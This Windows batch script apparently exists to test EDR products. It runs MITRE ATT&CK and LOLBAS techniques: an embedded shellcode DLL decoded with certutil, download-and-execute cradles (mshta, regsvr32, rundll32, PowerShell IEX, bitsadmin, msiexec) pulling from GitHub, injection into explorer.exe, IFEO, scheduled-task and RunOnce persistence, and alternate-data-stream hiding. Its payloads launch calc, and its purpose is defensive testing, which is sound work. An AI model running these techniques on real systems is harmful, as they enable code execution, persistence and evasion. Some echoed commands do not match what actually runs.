REM Source of inspiration: https://github.com/api0cradle/LOLBAS/tree/master/OSBinaries
REM Source of inspiration: https://attack.mitre.org/wiki/Main_Page
REM Author: op7ic
REM Description: Test the detection of various scripts/downloads/execs against your EDR solution.
REM Warning: You might have to click on few windows to close script execution. Don't run this on live system!
REM Version: 0.2a


echo **********************************************
echo *          EDR Testing Script                *
echo *          Version: 0.2a                     *
echo *          by: op7ic                         *
echo *                                            *
echo *                                            *
echo *                                            *
echo **********************************************

echo [+] Starting script execution at %time% %date%
echo %time% %date%: [+] Dumping DLL file which runs calc.exe (x86)
REM - DLL taken from https://github.com/peterferrie/win-exec-calc-shellcode
echo -----BEGIN CERTIFICATE----- > fi.b64
echo TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAA0AAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5v >> fi.b64
echo dCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAACpUmPY7TMNi+0zDYvtMw2L >> fi.b64
echo i93Di+wzDYvtMw2L7DMNiy07RIvsMw2LLTtKi+wzDYtSaWNo7TMNiwAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAFBFAABMAQMAwd7lUgAAAAAAAAAA4AAOIQsBBwoAAgAA >> fi.b64
echo AAQAAAAAAAAAEAAAABAAAAAgAAAAAAAQABAAAAACAAAEAAAAAAAAAAQAAAAAAAAA >> fi.b64
echo AEAAAAAEAAAAAAAAAgAAAAAAEAAAEAAAAAAQAAAQAAAAAAAAEAAAAAAgAABYAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMAAACAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAALnRleHQAAABdAAAAABAAAAACAAAABAAA >> fi.b64
echo AAAAAAAAAAAAAAAAIAAAYC5yZGF0YQAAWAAAAAAgAAAAAgAAAAYAAAAAAAAAAAAA >> fi.b64
echo AAAAAEAAAEAucmVsb2MAAAgAAAAAMAAAAAIAAAAIAAAAAAAAAAAAAAAAAABAAABC >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAFWL7OgIAAAAM8BdwgwAzMxgMdJSaGNhbGNUWVJRZIty >> fi.b64
echo MIt2DIt2DK2LMIt+GItfPItcH3iLdB8gAf6LVB8kD7csF0JCrYE8B1dpbkV18It0 >> fi.b64
echo HxwB/gM8rv/XWFhhwwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAMHe5VIAAAAAMiAAAAEAAAABAAAAAQAAACggAAAsIAAAMCAAAAAQAABMIAAA >> fi.b64
echo AAB3MzItZGxsLXJ1bi1zaGVsbGNvZGUuZGxsAF9EbGxNYWluQDEyAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAA== >> fi.b64
echo -----END CERTIFICATE----- >> fi.b64

echo **********************************************
echo *      Testing Mitre ATT&CK PAYLOADS         *
echo **********************************************

echo %time% %date%: [+] T1140 - Decoding AllTheThings.dll file with Certutil
start "" cmd /c certutil -f -decode fi.b64 AllTheThings.dll >nul
echo Command Excuted: certutil -f -decode fi.b64 AllTheThings.dll

sleep 3

echo %time% %date% [+] T1197 - Testing bitsadmin download
start "" cmd /c bitsadmin.exe /transfer /Download https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/CradleTest.txt Default_File_Path.ps1
echo Execution Finished at %time% %date%
echo Command Excuted: bitsadmin.exe /transfer /Download https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/CradleTest.txt Default_File_Path.ps1
start "" cmd /c powershell -c "Start-BitsTransfer -Priority foreground -Source https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/CradleTest.txt -Destination Default_File_Path.ps1
echo Command Excuted:powershell -c "Start-BitsTransfer -Priority foreground -Source https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/CradleTest.txt -Destination Default_File_Path.ps1
echo Execution Finished at %time% %date%

sleep 3

echo %time% %date% [+] T1118 - Testing InstallUtil x86"
start "" cmd /c C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U AllTheThings.dll
echo Execution Finished at %time% %date%
echo Command Excuted: C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U AllTheThings.dll
sleep 3

echo %time% %date% [+] T1118 - Testing InstallUtil x64
start "" cmd /c C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U AllTheThings.dll
echo Execution Finished at %time% %date%
echo Command Excuted: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U AllTheThings.dll

sleep 3

echo %time% %date% [+] T1170 - Testing mshtha
start "" cmd /c mshta.exe javascript:a=GetObject("script:https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/Mshta_calc.sct").Exec();close();
echo Execution Finished at %time% %date%
echo Command Excuted: mshta.exe javascript:a=GetObject("script:https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/Mshta_calc.sct").Exec();close();
sleep 3

echo %time% %date% [+] T1086 - Testing powershell cradle - WebClient
start "" cmd /c powershell -c "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/CradleTest.txt','Default_File_Path.ps1');IEX((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_})))"
echo Execution Finished at %time% %date%
echo Command Excuted: mshta.exe javascript:a=GetObject("script:https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/Mshta_calc.sct").Exec();close();
sleep 3


echo %time% %date% [+] T1121 - Testing regsvcs
start "" cmd /c C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe AllTheThings.dll
echo Execution Finished at %time% %date%
echo Command Excuted: C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe AllTheThings.dll
start "" cmd /c C:\Windows\Microsoft.NET\Framework\v2.0.50727\regsvcs.exe AllTheThings.dll
echo Execution Finished at %time% %date%
echo Command Excuted: C:\Windows\Microsoft.NET\Framework\v2.0.50727\regsvcs.exe AllTheThings.dll
echo Execution Finished at %time% %date%
start "" cmd /c C:\Windows\Microsoft.NET\Framework64\v2.0.50727\regsvcs.exe AllTheThings.dll
echo Execution Finished at %time% %date%
echo Command Excuted: C:\Windows\Microsoft.NET\Framework64\v2.0.50727\regsvcs.exe AllTheThings.dll
start "" cmd /c C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regsvcs.exe AllTheThings.dll
echo Execution Finished at %time% %date%
echo Command Excuted: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regsvcs.exe AllTheThings.dll

sleep 3

echo %time% %date% [+] T1121 - Testing regasm
start "" cmd /c C:\Windows\Microsoft.NET\Framework\v2.0.50727\regasm.exe /U AllTheThings.dll
echo Execution Finished at %time% %date%
echo Command Excuted: C:\Windows\Microsoft.NET\Framework\v2.0.50727\regasm.exe /U AllTheThings.dll
start "" cmd /c C:\Windows\Microsoft.NET\Framework64\v2.0.50727\regasm.exe /U AllTheThings.dll
echo Execution Finished at %time% %date%
echo Command Excuted: C:\Windows\Microsoft.NET\Framework64\v2.0.50727\regasm.exe /U AllTheThings.dll
sleep 3

echo %time% %date% [+] T1121 - Testing regasm x64
start "" cmd /c C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U AllTheThings.dll
echo Execution Finished at %time% %date%
echo Command Excuted: C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U AllTheThings.dll
start "" cmd /c C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /U AllTheThings.dll
echo Execution Finished at %time% %date%
echo Command Excuted: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /U AllTheThings.dll

sleep 3

echo %time% %date% [+] T1117 -  Testing regsvr32
start "" cmd /c regsvr32.exe /s /u /i:https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/Cmstp_calc.sct scrobj.dll
echo Execution Finished at %time% %date%
echo Command Excuted: regsvr32.exe /s /u /i:https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/Cmstp_calc.sct scrobj.dll

sleep 3

echo %time% %date% [+] T1127 - Testing MSBuild

echo ^<Project xmlns="http://schemas.microsoft.com/developer/msbuild/2003"^> > xxxFile.csproj
echo    ^<ItemGroup^>   >> xxxFile.csproj
echo         ^<Binaries Include="*.dll;*.exe"/^>   >> xxxFile.csproj
echo     ^</ItemGroup^>   >> xxxFile.csproj
echo   ^<Target Name="SetACL"^>   >> xxxFile.csproj
echo         ^<Exec Command="calc.exe"/^>   >> xxxFile.csproj
echo     ^</Target^>   >> xxxFile.csproj
echo ^</Project^>   >> xxxFile.csproj

start "" cmd /c C:\Windows\Microsoft.Net\Framework\v4.0.30319\MSBuild.exe xxxFile.csproj
echo Execution Finished at %time% %date%
echo Command Excuted: C:\Windows\Microsoft.Net\Framework\v4.0.30319\MSBuild.exe xxxFile.csproj

sleep 3

echo %time% %date% [+] T1047 - Testing wmic download
start "" cmd /c wmic process get brief /format:"https://raw.githubusercontent.com/api0cradle/LOLBAS/master/OSBinaries/Payload/Wmic_calc.xsl"
echo Execution Finished at %time% %date%
echo Command Excuted: wmic process get brief /format:"https://raw.githubusercontent.com/api0cradle/LOLBAS/master/OSBinaries/Payload/Wmic_calc.xsl"

sleep 3

echo %time% %date% [+] T1128 - Testing netsh.exe dll exec 
start "" cmd /c netsh trace start capture=yes filemode=append persistent=yes tracefile=trace.etl    
start "" cmd /c netsh trace show status    
start "" cmd /c netsh.exe add helper AllTheThings.dll
start "" cmd /c netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=8000 connectaddress=192.168.1.1
start "" cmd /c netsh interface portproxy delete v4tov4 listenport=8080 listenaddress=0.0.0.0
start "" cmd /c netsh trace stop
echo Execution Finished at %time% %date%
echo Command Excuted: netsh trace start capture=yes filemode=append persistent=yes tracefile=trace.etl    
echo Command Excuted: netsh trace show status 
echo Command Excuted: netsh.exe add helper AllTheThings.dll
echo Command Excuted: netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=8000 connectaddress=192.168.1.1
echo Command Excuted: netsh interface portproxy delete v4tov4 listenport=8080 listenaddress=0.0.0.0
echo Command Excuted: netsh trace stop

sleep 3
 
echo %time% %date% [+] T1085 - Testing rundll32 execution
start "" cmd /c rundll32 AllTheThings.dll,EntryPoint
echo Execution Finished at %time% %date%
echo Command Excuted: rundll32 AllTheThings.dll,EntryPoint

sleep 3

echo %time% %date% [+] T1085 - Testing rundll32 download & exec
start "" cmd /c rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/test")
echo Execution Finished at %time% %date%
echo Command Excuted: rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/test")

sleep 3
echo %time% %date% [+] T1085 - Testing rundll32 exec
start "" cmd /c rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WScript.Shell").run("calc.exe",0,true);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im rundll32.exe && exit",0,true);}
echo Execution Finished at %time% %date%
echo Command Excuted: rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WScript.Shell").run("calc.exe",0,true);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im rundll32.exe && exit",0,true);}
sleep 3

echo %time% %date% [+] T1130 - Testing certutil download 
start "" cmd /c certutil.exe -urlcache -split -f https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/CradleTest.txt Default_File_Path2.ps1  
echo Execution Finished at %time% %date%
echo Command Excuted: certutil.exe -urlcache -split -f https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/CradleTest.txt Default_File_Path2.ps1
sleep 3

echo %time% %date% [+] T1191 - Testing cmstp download
start "" cmd /c cmstp.exe /ni /s https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/Cmstp.inf
echo Execution Finished at %time% %date%
echo Command Excuted: cmstp.exe /ni /s https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/Cmstp.inf
sleep 3
echo %time% %date% [+] T1202 - Indirect Command Execution
start "" cmd /c forfiles /p c:\windows\system32 /m notepad.exe /c calc.exe
echo Execution Finished at %time% %date%
echo Command Excuted: forfiles /p c:\windows\system32 /m notepad.exe /c calc.exe
sleep 3
echo %time% %date% [+] T1028 - Testing Windows Remoting exec
start "" cmd /c winrm qc -q 
start "" cmd /c winrm i c wmicimv2/Win32_Process @{CommandLine="calc"}
echo Execution Finished at %time% %date%
echo Command Excuted: winrm qc -q 
echo Command Excuted: winrm i c wmicimv2/Win32_Process @{CommandLine="calc"}
sleep 3
echo %time% %date% [+] T1053 - Adding Scheduled Task exec ONLOGON
start "" cmd /c schtasks /create /tn "mysc" /tr C:\windows\system32\calc.exe /sc ONLOGON /ru "System"
echo Execution Finished at %time% %date%
echo Command Excuted: schtasks /create /tn "mysc" /tr C:\windows\system32\calc.exe /sc ONLOGON /ru "System"
sleep 3
echo %time% %date% [+] T1216 - Signed Script Proxy Execution
start "" cmd /c cscript /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs 127.0.0.1 script:https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/test.sct
echo Execution Finished at %time% %date%
echo Command Excuted: cscript /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs 127.0.0.1 script:https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/test.sct
sleep 3
echo %time% %date% [+] T1218 / T1055 - Signed Binary Proxy Execution
start "" cmd /c  for /f "tokens=1,2 delims= " %A in ('tasklist /fi ^"Imagename eq explorer.exe^" ^| find ^"explorer^"') do C:\Windows\system32\mavinject.exe %B /INJECTRUNNING AllTheThings.dll
echo Command Excuted: for /f "tokens=1,2 delims= " %A in ('tasklist /fi ^"Imagename eq explorer.exe^" ^| find ^"explorer^"') do C:\Windows\system32\mavinject.exe %B /INJECTRUNNING AllTheThings.dll
start "" cmd /c  for /f "tokens=1,2 delims= " %A in ('tasklist /fi ^"Imagename eq explorer.exe^" ^| find ^"explorer^"') do C:\Windows\SysWOW64\mavinject.exe %B /INJECTRUNNING AllTheThings.dll
echo Command Excuted:  for /f "tokens=1,2 delims= " %A in ('tasklist /fi ^"Imagename eq explorer.exe^" ^| find ^"explorer^"') do C:\Windows\SysWOW64\mavinject.exe %B /INJECTRUNNING AllTheThings.dll
echo Execution Finished at %time% %date%
sleep 3
echo %time% %date% [+] T1033 - System Owner/User Discovery
start "" cmd.exe /C whoami
start "" wmic useraccount get /ALL
start "" cmd.exe /C net group "domain administrators" /domain
echo Execution Finished at %time% %date%
echo Command Excuted: cmd.exe /C whoami
echo Command Excuted: wmic useraccount get /ALL
echo Command Excuted: cmd.exe /C net group "domain administrators" /domain
sleep 3
echo %time% %date% [+] T1158 - Hiding data in ADS
echo "test123 > 12.txt
echo "test" > 12.txt:12
echo Execution Finished at %time% %date%
echo Command Excuted: echo "test123 > 12.txt
echo Command Excuted: echo "test123 > 12.txt
sleep 3
echo %time% %date% [+] T1183 - Exec via File Execution Options

start "" cmd /c  REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\paint.exe" /v Debugger /d "calc.exe"
start "" cmd /c  REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\paint.exe" /v GlobalFlag /t REG_DWORD /d 512 
start "" cmd /c  REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\paint.exe" /v ReportingMode /t REG_DWORD /d 1 REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\#{target_binary}" /v MonitorProcess /d "calc.exe"
echo Execution Finished at %time% %date%
echo Command Excuted: REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\paint.exe" /v Debugger /d "calc.exe"
echo Command Excuted: REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\paint.exe" /v GlobalFlag /t REG_DWORD /d 512 
echo Command Excuted: REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\paint.exe" /v ReportingMode /t REG_DWORD /d 1 REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\#{target_binary}" /v MonitorProcess /d "calc.exe"
sleep 3
echo %time% %date% [+] T1096 - NTFS File Attributes
type C:\windows\system32\cmd.exe > "123.txt:evil.exe"
start "" cmd /c certutil.exe -urlcache -split -f https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/test.sct testADS.txt:test
echo Execution Finished at %time% %date%
echo Command Excuted: type C:\windows\system32\cmd.exe > "123.txt:evil.exe"
echo Command Excuted: certutil.exe -urlcache -split -f https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/test.sct testADS.txt:test
sleep 3

echo **********************************************
echo *      Testing LOLBAS PAYLOADS               *
echo **********************************************

echo %time% %date% [+] Testing msiexec exec
start "" cmd /c msiexec /q /i https://github.com/op7ic/EDR-Testing-Script/blob/master/Payloads/notepad.msi?raw=true  
start "" cmd /c msiexec /i https://github.com/op7ic/EDR-Testing-Script/blob/master/Payloads/notepad.msi?raw=true
echo Execution Finished at %time% %date%
echo Command Excuted: msiexec /q /i https://github.com/op7ic/EDR-Testing-Script/blob/master/Payloads/notepad.msi?raw=true 
echo Command Excuted: msiexec /i https://github.com/op7ic/EDR-Testing-Script/blob/master/Payloads/notepad.msi?raw=true
sleep 3
echo %time% %date% [+] Testing diskshadow exec
echo exec calc.exe > diskshadow.txt
start "" cmd /c  diskshadow.exe /s diskshadow.txt
echo Execution Finished at %time% %date%  
echo Command Excuted: exec calc.exe > diskshadow.txt
echo Command Excuted: diskshadow.exe /s diskshadow.txt
sleep 3
echo %time% %date% [+] Testing Esentutl.exe download & exec
start "" cmd /c  esentutl.exe /y \\live.sysinternals.com\tools\adrestore.exe /d adrestore.exe /o  
start "" cmd /c  adrestore.exe   
echo Execution Finished at %time% %date%  
echo Command Excuted: esentutl.exe /y \\live.sysinternals.com\tools\adrestore.exe /d adrestore.exe /o
echo Command Excuted: adrestore.exe
sleep 3
echo %time% %date% [+] Testing replace.exe download & exec
start "" cmd /c replace \\live.sysinternals.com\tools\adrestore.exe adrestore2.exe /A
start "" cmd /c adrestore2.exe   
echo Execution Finished at %time% %date% 
echo Command Excuted: replace \\live.sysinternals.com\tools\adrestore.exe adrestore2.exe /A
echo Command Excuted: adrestore2.exe  
sleep 3
echo %time% %date% [+] Testing SyncAppvPublishingServer.vbs download & exec
start "" cmd /c  C:\Windows\System32\SyncAppvPublishingServer.vbs "n;(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/CradleTest.txt','Default_File_Path.ps1');IEX((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_})))"
echo Execution Finished at %time% %date% 
echo Command Excuted: C:\Windows\System32\SyncAppvPublishingServer.vbs "n;(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/CradleTest.txt','Default_File_Path.ps1');IEX((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_})))"
sleep 3
echo %time% %date% [+] Testing HH.exe download
start "" cmd /c  HH.exe https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/CradleTest.txt
echo Execution Finished at %time% %date% 
echo Command Excuted: HH.exe https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/CradleTest.txt
sleep 3
echo %time% %date% Testing ieexec.exe download & execute"exec"
start "" cmd /c  ieexec.exe https://github.com/op7ic/EDR-Testing-Script/blob/master/Payloads/notepad.msi?raw=true  
echo Execution Finished at %time% %date% 
echo Command Excuted: ieexec.exe https://github.com/op7ic/EDR-Testing-Script/blob/master/Payloads/notepad.msi?raw=true  
sleep 3
echo %time% %date% [+] Testing Setupapi driever installation & exec
echo ^; DRIVER.INF > calc.inf
echo ^; Copyright (c) Microsoft Corporation.  All rights reserved. >> calc.inf
echo [Version] >> calc.inf
echo Signature = "$CHICAGO$" >> calc.inf
echo Class=61883 >> calc.inf
echo ClassGuid={7EBEFBC0-3200-11d2-B4C2-00A0C9697D17} >> calc.inf
echo Provider=%Msft% >> calc.inf
echo DriverVer=06/21/2006,6.1.7600.16385 >> calc.inf
echo [DestinationDirs] >> calc.inf
echo DefaultDestDir = 1 >> calc.inf
echo [DefaultInstall] >> calc.inf
echo AddReg = CalcStart >> calc.inf
echo [CalcStart]
echo HKLM,Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce,Install,,cmd.exe /c """calc.exe""" >> calc.inf

start "" cmd /c  rundll32 setupapi,InstallHinfSection DefaultInstall 132 calc.inf
echo Execution Finished at %time% %date% 
echo Command Excuted: rundll32 setupapi,InstallHinfSection DefaultInstall 132 calc.inf
sleep 3

echo %time% %date% [+] Testing Shdocvw exec via rundll32
echo [InternetShortcut] > C:\windows\temp\url.url
echo URL=file:///c:\windows\system32\calc.exe >> C:\windows\temp\url.url
start "" cmd /c  rundll32.exe shdocvw.dll, OpenURL C:\windows\temp\url.url
echo Execution Finished at %time% %date%
echo Command Excuted: [InternetShortcut] > C:\windows\temp\url.url
echo Command Excuted: URL=file:///c:\windows\system32\calc.exe >> C:\windows\temp\url.url
echo Command Excuted: rundll32.exe shdocvw.dll, OpenURL C:\windows\temp\url.url
sleep 3

echo %time% %date% [+] Testing csc exec

echo public class x{public static void Main(){System.Diagnostics.Process.Start("calc");}} >>  payload.cs

start "" cmd /c  C:\Windows\Microsoft.NET\Framework\v2.0.50727\csc.exe /out:payload.exe payload.cs
start "" cmd /c  C:\Windows\Microsoft.NET\Framework64\v2.0.50727\csc.exe /out:payload.exe payload.cs
start "" cmd /c  C:\Windows\Microsoft.NET\Framework\v4.0.30319\Csc.exe /out:payload.exe payload.cs
start "" cmd /c  C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Csc.exe /out:payload.exe payload.cs
start "" cmd /c  payload.exe
echo Execution Finished at %time% %date%
echo Command Excuted: public class x{public static void Main(){System.Diagnostics.Process.Start("calc");}} >>  payload.cs
echo Command Excuted: C:\Windows\Microsoft.NET\Framework\v2.0.50727\csc.exe /out:payload.exe payload.cs
echo Command Excuted: C:\Windows\Microsoft.NET\Framework64\v2.0.50727\csc.exe /out:payload.exe payload.cs
echo Command Excuted: C:\Windows\Microsoft.NET\Framework\v4.0.30319\Csc.exe /out:payload.exe payload.cs
echo Command Excuted: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Csc.exe /out:payload.exe payload.cs
echo Command Excuted: payload.exe 

echo [+] Let tasks finish before killing all the files
sleep 90

echo [+] Cleanup

start "" cmd /c del xxxFile.csproj
start "" cmd /c del AllTheThings.dll
start "" cmd /c del fi.b64
start "" cmd /c del diskshadow.txt 
start "" cmd /c del adrestore.exe
start "" cmd /c del Default_File_Path.ps1
start "" cmd /c del trace.etl
start "" cmd /c del adrestore.exe
start "" cmd /c del adrestore2.exe
start "" cmd /c del trace.etl
start "" cmd /c del trace.cab
start "" cmd /c del calc.inf
start "" cmd /c del 12.txt
start "" cmd /c del payload.cs
start "" cmd /c del payload.exe
start "" cmd /c del testADS.txt
